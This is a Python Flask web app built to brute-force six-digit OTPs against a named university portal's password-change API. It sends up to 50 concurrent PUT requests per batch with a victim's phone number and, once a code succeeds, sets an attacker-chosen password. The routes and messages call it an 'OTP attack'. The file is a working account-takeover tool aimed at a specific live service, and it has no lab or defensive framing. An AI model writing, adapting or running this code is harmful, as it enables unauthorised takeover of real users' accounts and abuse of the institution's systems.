import os
import eventlet
eventlet.monkey_patch()  # must be first

from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO
import asyncio
import aiohttp

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode='gevent', cors_allowed_origins="*")

# Default configuration
API_URL = "https://sitareuniv.digiicampus.com/api/userManagement/change/password"
DEFAULT_COOKIE = "amplitude_iddigiicampus.com=YOUR_COOKIE_HERE"
DEFAULT_START = 100000
DEFAULT_MAX = 999999
DEFAULT_CONCURRENT = 50
DEFAULT_PASSWORD = "Sitare@09099"

# Store stop flags per client
stop_flags = {}

# Async OTP function
async def try_otp(session, phone, otp, stop_flag, cookie, new_password):
    if stop_flag['stop']:
        return None

    payload = {"phone": phone, "otp": str(otp), "newPassword": new_password}
    headers = {"Content-Type": "application/json", "Cookie": cookie}

    try:
        async with session.put(API_URL, json=payload, headers=headers) as resp:
            text = await resp.text()

            # Success: Empty response body
            if not text.strip():
                stop_flag['stop'] = True
                socketio.emit('finished', {
                    'status': 'success',
                    'otp_used': otp,
                    'message': 'Password changed successfully!'
                })
                return {"status": "success", "otp_used": otp, "response": text}

            # Check for invalid OTP stop condition
            try:
                data_resp = await resp.json()
                if data_resp.get("message") == "Invalid request, Otp already used":
                    stop_flag['stop'] = True
                    socketio.emit('finished', {
                        'status': 'stopped',
                        'otp_used': otp,
                        'message': data_resp["message"]
                    })
                    return {"status": "stopped", "otp_used": otp, "response": data_resp}
            except:
                pass

            socketio.emit('log', {'otp': otp, 'status': 'attempted', 'response': text})
    except Exception as e:
        socketio.emit('log', {'otp': otp, 'status': 'failed', 'response': str(e)})

    return None


# Background OTP runner
def start_otp_background(client_id, phone, start, max_otp, concurrent, cookie, new_password):
    async def runner():
        stop_flag = stop_flags[client_id]
        connector = aiohttp.TCPConnector(limit=concurrent)
        async with aiohttp.ClientSession(connector=connector) as session:
            for batch_start in range(start, max_otp + 1, concurrent):
                if stop_flag['stop']:
                    break
                tasks = []
                for i in range(concurrent):
                    otp = batch_start + i
                    if otp > max_otp:
                        break
                    tasks.append(asyncio.create_task(
                        try_otp(session, phone, otp, stop_flag, cookie, new_password)
                    ))
                await asyncio.gather(*tasks)
    eventlet.spawn(asyncio.run, runner())


# Routes
@app.route('/')
def index():
    return render_template('index.html')


@app.route('/start', methods=['POST'])
def start_attack():
    data = request.json
    phone = data.get('phone')
    client_id = data.get('client_id', 'default')

    if not phone:
        return jsonify({'status': 'error', 'message': 'Phone number required'}), 400

    start = int(data.get('start') or DEFAULT_START)
    max_otp = int(data.get('max') or DEFAULT_MAX)
    concurrent = int(data.get('concurrent') or DEFAULT_CONCURRENT)
    cookie = data.get('cookie') or DEFAULT_COOKIE
    new_password = data.get('new_password') or DEFAULT_PASSWORD

    stop_flags[client_id] = {'stop': False}

    start_otp_background(client_id, phone, start, max_otp, concurrent, cookie, new_password)
    return jsonify({'status': 'started', 'message': 'OTP attack started!'})


@app.route('/stop', methods=['POST'])
def stop_attack():
    data = request.json
    client_id = data.get('client_id', 'default')

    if client_id in stop_flags:
        stop_flags[client_id]['stop'] = True
        return jsonify({'status': 'stopped', 'message': 'Attack stopped!'})
    return jsonify({'status': 'error', 'message': 'No active attack found'}), 400


# Run server
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host="0.0.0.0", port=port, debug=True)
